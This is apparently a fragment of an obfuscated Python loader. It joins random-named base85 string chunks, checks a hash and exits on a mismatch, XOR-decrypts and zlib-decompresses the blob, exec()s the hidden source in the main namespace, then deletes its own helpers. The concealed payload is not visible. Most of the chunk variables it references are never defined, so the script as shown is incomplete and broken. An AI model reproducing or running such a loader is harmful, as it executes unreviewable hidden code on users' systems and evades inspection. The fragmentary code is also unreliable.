_cw6xLdUpXSPSSw = 'qz){X65%H^M8QmcL&S;=&J5V_6t)CIq@mZfQz;vfhvs'
_cdpECcVLR2SbOD = 's`6`2~jZ9ZaOiH)7!va6DJH?4y3v6&v@n`%K5OW0)?p'
_cfEUP0Y8U9EJkj = 'xt<+N>nSRv{KjHY8nmhsnMG2Gb&K9-9gB%w0t@rk9T!'
_ccMp79fWQrGREn = 'yVdRCanMD<wccpuGAuM7#dBm>sfVm}^HfSP;wp}UwRe'
_ccpVLV7RnTbGZO = 'h-V3+RBxB=aZB;&&n_qWNIM!upW5#K1<#pO~Vmb?aWa'
_coVIbU9Lo5sD5m = 'b5%4xH?3y6m*nrZSq>qh*4^VlLaCDFcE25$h%X}m08~'
_cmF2k996ZssOL5 = '*&kV&>vTbs9Eo5<Bh*Ml?U9iagp$I#IN*33}XEq3nua'
_ci_eX16m5cTTxV = 'U5L5kwE*%y|n0*MY<p9*|Yi%iF9jv<a?Mk&io&p-qUW'
_cifdF90xgiVGk4 = 'e5swOl(R$~XxI;(Hdk=|D8ye0mC@n||4~y&SlR(%-pK'
_ceKGhodvfCUMTu = '^1$?BI_9R{7?s3=8%kro0{qco|T%gt!(<~J39=;y`^t'
_crAQUaa06a3_E0 = 'QN2P$%-Xe^?ksJvUwcP{?lcV9%}Kb+VLc%UUksxFb}$'
_cfhAjsKROySu2o = 'h0@HRenKCjTl<{LC`BT{=tkk;%hGg743MuT$Qh0~xAf'
_cn1yERD6C0fM5d = 'OVDOm@6~*TOw}QD(Af?oPQwni$o_|4uf*=Iq95A8oKC'
_cukHgmo7nyJtXm = ')MhNcN42zssHshQo7<E-kf`bTVu1)-ptn?^GA78F$5V'
_cxRvMBm5whMKLS = 'zy!hLqL*?kebN)cu)UdHARv|gtHE{P3ln6O6eEJgo?%'
_cp6lG1I5sbs6er = '_|YDbDCVJIj3*fO4f{d4BLeW1h#x9qqauTRvPi?lRJK'
_cmRHcSi1oE0PfF = 'K082Y?8TDSIB~yIeZlU}jBzMHE@=6F21R55;?V)&MAH'
_cxXxjfnI_bk9W9 = 'B6lx_7ss>E)!Qfpcns+cWXGCd9taZ+EOE(sW=LoQCLs'
_ciTsoRZsC_XeVP = 'J3k2Jo2&W&lA5vVO_urzxyuVp-hzt!4N9!D^0fKYN_9'
_cdyAw907N8huW0 = ')`c(DiO#<#RkWoH1cBfhyjNT5lvv<HuNF-FOqH$poBX'
_cd4KcIjbkBJQlf = 'QMNwUE`P@X9>?g8%ZK0TR{o3D6&0MwSeme_%jKdXM9A'
_ci9LsF4d5md3av = '4!(m6dg2}D~jQI;opzR~RjhzWCl&(Kr{SL8lk9e+vpN'
_ck6opLcqnEeVK7 = '|E7-|-Bh'

_ptnHipjYM_Lift = __import__('base64').b85decode(_chz7QZGdrWaTjE + _cxI1GkRrNVa9JW + _citj0gZsFfclM1 + _cx6CQf2qp9EPPP + _cusW0rvGFLfvw0 + _cbM5Kwsje9OatD + _czpWoPzvjF1TQF + _cj0FE0Z7tNQCMY + _coRPL4zWHkyFfK + _ciwZUuTOQtyFzR + _cwciOFzCyh5U3d + _ca2q_2o4yQjjV7 + _cqn6tboFudN6_D + _cp9kx7uPg4nJuR + _cdipM2YC50yZj7 + _c_BypKg4w7fQGn + _cixiFz3qG3sDbw + _ctXUFEckuS_6BS + _cy1kqKwJcYW8pU + _cduBPZl6hQuHVe + _cyDGaFoTysDJ4j + _ceEAyzxCUj2TtZ + _cjTMu8rkJkYEQj + _cuH0LtLMZVjkz9 + _cpVFf_RSt97BG5 + _cqPqIzQ0zTBxN0 + _csmSEjfXaBRzCH + _cmlhat9JdkRStf + _cheBB_NVXbivtT + _ctYDhvkCGPiJE7 + _cwOqNBQz5m1fc9 + _ctyy8rw1jco_Ze + _ctliWKx5N49fk8 + _chtOACSZ7N6QDl + _cc4u_3Lfh0ptih + _csDbfwKBVTWrrO + _ccsf1ZwA4oL1Ze + _cfZTCRUXgIMTyu + _cndlpgnIq42yi3 + _csrDJ08v92Cj0z + _cxkhgkFSPv33cT + _cvm8wez2yhjSUV + _ciyYNqZR0fv4zk + _cmhLgmibhz3Nou + _cxKN_JnA_xeSLT + _chUa_7Oaaiz9ta + _caw9Pknm2w9MxU + _ceaOSxqr1P6Iz_ + _cpWbF2nRCuO5A4 + _ctUCo_Pd_N2yKQ + _cuyPcvRTaT7B9Q + _cpZ8dXxjoxu_Y5 + _ch8bV0ISrX1lFF + _cy6S7IHJco4tu_ + _cqBNJjPWWqSGN7 + _crROKBITKoOX5W + _cx5IWpmqUAH6_L + _crkX0HU1buq0eV + _cfdw22s78eBMu8 + _cjrjj2cC1kDWCd + _cpQxBfsKNZLlny + _caob6PHgraXGYz + _ctbcCH9VKcVag3 + _cna4WBksEKAmTz + _cnqlY2maq_dfFR + _ccWYQco7yS4umk + _cs_9yQKLxfT4XY + _cvmuSxuW8YaVrH + _czpt3YAJ9KMd7n + _csQ0CZVltDBkIy + _csnUxpygYqmcpS + _cazvqyMBACdouT + _cur1z36iK271VV + _cfO1Rv12TMb6Qe + _cimjVjzJ8lFmx9 + _cfxwSlg6tZ94fh + _clWmNvY3poOYDD + _cuOFR0zYKEdf0A + _cjrl4soE6YF79R + _cabpa1kOC41s7d + _cp9Hj9E3ShPnsd + _coGeKfy7FcvqW8 + _coRBNMN5Oawz8M + _cyGZmiGih0C1qM + _cgWZZX6lr8JBqJ + _cm3c4AWajQlXi0 + _cuwqbx9OJjZSpD + _cnMR6zP6bEnfg_ + _cw7gGSlg6MZFIS + _ckvMTY4D0h0ell + _cpC9rhDaN3ewKF + _crIvllNOh3IPUp + _cnEYqfYj_5Zj4c + _csB5M95lxgFBf3 + _civx8EW_U0zH_A + _ctYkJajMtTxBod + _crtmLCaSGNrUlb + _cs_leeAUOIIeAv + _cgPWRodMaOTuhg + _crR0Uh9aEVvzyU + _cckAu0nI7hhDU2 + _cl7whitcIpyvaP + _culYB_ioMMnxZM + _cbaEuULlXTtO7f + _cdFvaX6Lc4DEeE + _cnLSLn3in8vmZU + _ctU6KlQbCXoWyT + _cxTMEkwPCLL8PK + _ceqXsU8qvCaEOq + _caSFrBJrkGVjwD + _ccOW7bxrs3NTZ7 + _cnQGvlq1TKpVBm + _ctj6WNCS0LmSpf + _cqAYnIyCJjZCK5 + _cdWPg7C0HertYC + _caa7SRUlaJ7uNO + _cwuaRhU9rCXwhO + _crmhUF9p6pjyJT + _cvpLBiKy7qZiFj + _cxOZjTkusCIe1A + _ctrmsAA8Jezxlz + _ccZkIvoby6kzVq + _cvyTeGUM9p1mqE + _ckZFgBkslTExeH + _crLwOa9MPSuYpD + _ct__W3Yhos40GO + _cytQtJ7rPWLnKY + _ckuRwA0Qbjjs9V + _cayGRocTOuGjfF + _czTNe1BXlygwQe + _cz7uIC9ElWzLXt + _coHWFSANoe00Im + _cmTWr7TWYjK44Y + _cnM_cC8nUr2nnJ + _ctXy3GaiSpQ4nW + _coYTDWmcrtWesi + _cpFFMkqtktjred + _cp_dMybttzWRgU + _cwzVeYjM0y32pr + _cmQq5GxBjaWHVy + _cmklGbZV8NNRbw + _chmwIdAcrwwIlA + _csEV8TH7OcZ0Ip + _cgA3UpDUNOrgun + _cm8j7F3XkiWvZ5 + _cv4AwBcIej7QoQ + _coUJdcM9eX7ziA + _cjtHZ0dSTDTWd_ + _cux9Mr6ri_a67l + _cg5ribFMXRbFzX + _cw00nz13A1GzvB + _cuuYClSoWoylpR + _c_Ui_GBf6CdUR2 + _cboltDYstUDGcQ + _ctp4OjhTEMhYk4 + _coQYFE56JWe2Rb + _chiEJHyWNgeTmp + _cuzUkRDqnxPKk3 + _cn4BL4SXcQ617P + _cxsNOq68bduaFg + _csbhG4gGv36SFl + _cctTOjwVeSFduW + _cuvAtcUYkKuAhx + _ctDJUZs3pzkl51 + _crXltw4B4pSDfc + _ckV0Fwyjb1W6Cp + _chVQ61sh85ezCm + _ckJjm6yJ2_JeJj + _chCCT7jvTx7_vZ + _cxgDwvZJxV2vVA + _ch03N2nhJw6Xjo + _csHWHEb8josB1t + _ccrvhBgO6wKBvq + _cxLcESnQ_cnYWY + _cxVnhv7A6OcPrA + _cnpb2FEWGhCrPT + _cyFzij2PYxls3p + _ciwLLCEMD_x6jZ + _coThhGaD8vzgwn + _cuHgSUZTWFe3S5 + _cf6jaWv7eqIVhN + _cviRn3UZ6hQJBg + _cgtESysyOT4Q17 + _cutCEOKKusrKcQ + _ccLCyJRDgcP2_d + _cd0Po_nOqEcr98 + _caUtaboYTVeEvU + _ciQMmBxpq02pZs + _cw60rNLvBK4Z1L + _cnjJI1sL7m2wSA + _clceMXeypsngmI + _cvzcHmwvZ8tmB6 + _ckJlyPMVq5PFI3 + _ckNswOW7MGT6sO + _caeruWcEabhOrA + _coBDGjp_Ml64U5 + _caKKA3GuTC1hHJ + _cvzOiO4FRACyBw + _cr58XmPlGl22so + _cdQpo3FRlRkniJ + _cnxGBk1CIOWfP1 + _cxq2JAH8CjWAiG + _ct9pzs47IjR0si + _czg25wXUO_IlFR + _c_8rnkwp0yERQK + _cieUWPaXXUXKgT + _cfKa1kR8DFLCPY + _cvkbwpHR3OYBOr + _cvS_gOJM_T9VNl + _ctaAdfjPbuDCyi + _csOpdvubj2r248 + _chtAA68QNu58Or + _czpjbY7O1AhG6j + _cqQ5fHAAaIRwdU + _co1gSz59de42VE + _cbodSRqr35v0e0 + _ck4Sf1oCIukk2y + _ccZ3cx0IM2FtL2 + _cy1w1s1c6_RFtq + _cm09dZporSHmJN + _cbY_7xzK_7LEUr + _cdJWLwrWAVELh7 + _cruUFgWAaHxs51 + _c_kDkqOyBTQYuw + _cagubCuq25cBFE + _c_LUXlLKrMD1o2 + _cvkzufEgQcUykC + _cjb8hHx8idVwdb + _cklQtk6hK_E7vw + _ceS3EayVUxBexs + _cthItP5S0qxNNu + _coOr5eRW1JGjNV + _cw6xLdUpXSPSSw + _cdpECcVLR2SbOD + _cfEUP0Y8U9EJkj + _ccMp79fWQrGREn + _ccpVLV7RnTbGZO + _coVIbU9Lo5sD5m + _cmF2k996ZssOL5 + _ci_eX16m5cTTxV + _cifdF90xgiVGk4 + _ceKGhodvfCUMTu + _crAQUaa06a3_E0 + _cfhAjsKROySu2o + _cn1yERD6C0fM5d + _cukHgmo7nyJtXm + _cxRvMBm5whMKLS + _cp6lG1I5sbs6er + _cmRHcSi1oE0PfF + _cxXxjfnI_bk9W9 + _ciTsoRZsC_XeVP + _cdyAw907N8huW0 + _cd4KcIjbkBJQlf + _ci9LsF4d5md3av + _ck6opLcqnEeVK7)
if __import__('hashlib').sha256(_ptnHipjYM_Lift).hexdigest() != '8d5ff07f87c8480a458a08c0dc3744e3a47533d9e78b5b6836d6bb885115b836':
    __import__('sys').exit(1)
_xckI2sN44_SlpB = bytes([122, 246, 78, 183, 86, 98, 222, 75, 250])
_fkfb2PQzPJOIPqr = bytes([221, 110, 231, 2, 160, 199, 230, 241, 193])

def _fx_K72GEMsaDN0z(_bkE4zSGsr57bdS, _ktFAabkBvAYy3f):
    return bytes(_bkE4zSGsr57bdS[_iu92rwMRd5SV5d] ^ _ktFAabkBvAYy3f[_iu92rwMRd5SV5d % len(_ktFAabkBvAYy3f)] for _iu92rwMRd5SV5d in range(len(_bkE4zSGsr57bdS)))

def _fdkpWuOZ_2ARVRy(_tyIdQ_9OZW9dgt):
    import zlib
    return zlib.decompress(_tyIdQ_9OZW9dgt) # Un seul niveau de zlib ici pour simplifier

def _fezxyxaTb4ai1Ar():
    import sys, builtins
    # 1. Déchiffrement XOR
    _x_9RJwI9gv7eKo = _fx_K72GEMsaDN0z(_ptnHipjYM_Lift, _xckI2sN44_SlpB)
    # 2. Décompression Zlib
    _dwcXFxrWFaK0U_ = _fdkpWuOZ_2ARVRy(_x_9RJwI9gv7eKo)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dwcXFxrWFaK0U_.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _ngnFqx19GDE_SK = _main.__dict__
    _ngnFqx19GDE_SK.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _ngnFqx19GDE_SK)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fezxyxaTb4ai1Ar()
try:
    del _fx_K72GEMsaDN0z, _fdkpWuOZ_2ARVRy, _fezxyxaTb4ai1Ar
    del _ptnHipjYM_Lift, _xckI2sN44_SlpB, _fkfb2PQzPJOIPqr
except:
    pass
